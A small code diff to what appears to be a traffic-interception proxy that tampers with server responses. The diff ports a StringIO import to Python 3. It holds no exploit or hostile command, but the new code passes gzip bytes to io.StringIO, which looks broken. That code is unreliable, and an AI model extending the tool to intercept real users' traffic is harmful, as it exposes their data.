@@ -16,7 +16,8 @@
 # USA
 #
 
-import logging, re, string, random, zlib, gzip, StringIO
+import logging, re, string, random, zlib, gzip
+from io import StringIO
 import plugins.external.sergio_proxy.plugins
 from ResponseTampererFactory import ResponseTampererFactory
 from twisted.web.http import HTTPClient
@@ -133,7 +134,7 @@ class ServerConnection(HTTPClient):
     def handleResponse(self, data):
         if (self.isCompressed):
             logging.debug("Decompressing content...")
-            data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
+            data = gzip.GzipFile('', 'rb', 9, StringIO(data)).read()
             
         logging.log(self.getLogLevel(), "Read from server:\n" + data)
 
